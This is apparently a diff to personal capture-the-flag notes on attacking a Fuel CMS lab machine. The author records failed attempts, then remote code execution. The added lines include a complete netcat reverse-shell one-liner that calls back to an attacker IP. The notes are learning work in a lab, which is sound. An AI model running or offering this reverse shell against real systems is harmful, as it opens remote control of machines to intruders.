@@ -56,4 +56,8 @@ http://10.10.192.215/fuel/pages/select/?nocache=1507880376191&input=&target=&tit
 - It works now i just have to build my payload and use it to read some daunting files from the system.
 - Ive tried things, nothing works on the website and it gives no info. Went to read some walkthroughs and stuff like that. Even went to look for vulnerabilities associated with the version of fuel cms used but it still gave me headache. I have not given up.. i am just going to learn new ways LOL.
 
-- 
+- I got an exploit that allowed remote code execution on the target system, through fuel cms. About to get reverse shell now.
+```
+"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.29.246 9999 >/tmp/f"
+
+```
